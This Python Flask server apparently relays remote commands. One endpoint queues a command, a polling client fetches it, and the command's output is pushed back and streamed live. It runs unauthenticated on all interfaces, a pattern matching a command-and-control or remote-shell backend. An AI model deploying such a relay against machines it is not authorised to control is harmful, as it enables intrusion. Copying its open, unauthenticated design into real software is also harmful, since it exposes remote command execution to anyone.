from flask import Flask, request, Response, jsonify
import queue
import threading

app = Flask(__name__)

stream_queue = queue.Queue()
current_command = None
lock = threading.Lock()

@app.route("/send", methods=["POST"])
def send_command():
    global current_command
    data = request.json
    cmd = data.get("command")

    if not cmd:
        return jsonify({"error": "No command"}), 400

    with lock:
        current_command = cmd

    return jsonify({"status": "command accepted"})

@app.route("/fetch", methods=["GET"])
def fetch_command():
    global current_command
    with lock:
        cmd = current_command
        current_command = None
    return jsonify({"command": cmd})

@app.route("/push", methods=["POST"])
def push_output():
    data = request.json
    line = data.get("line")
    if line is not None:
        stream_queue.put(line)
    return "OK"

@app.route("/stream")
def stream():
    def event_stream():
        while True:
            line = stream_queue.get()
            yield f"data: {line}\n\n"

    return Response(event_stream(), mimetype="text/event-stream")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000, threaded=True)
